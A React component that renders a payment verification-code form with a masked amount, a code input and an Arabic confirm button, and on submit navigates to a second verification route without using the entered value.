import React from "react";
import { useNavigate } from "react-router";

function VerificationCode() {
  const nav = useNavigate();
  const handelSubmit = function (e) {
    e.preventDefault();
    nav("/verificationCode2");
  };
  return (
    <div className="bg-white">
      <div
        className="p-4 rounded-lg border shadow-lg  max-w-[650px] mx-auto  text-slate-700"
        style={{ direction: "ltr" }}
      >
        <div>Images</div>
        <p className="my-8">
          Please enter the verification code we just sent to your mobile number
        </p>
        <div>
          You are paying <br />
          the amount <br />
          *******
        </div>
        <form className="my-6" onSubmit={(e) => handelSubmit(e)}>
          <h4 className="font-semibold text-xl  text-center">
            Enter Verification Code
          </h4>
          <input required type="text" className="input-text" />
          <button className="bg-main w-1/2 mx-auto p-3 rounded-lg block text-white font-semibold text-xl my-4">
            تاكيد
          </button>
        </form>
      </div>
    </div>
  );
}

export default VerificationCode;
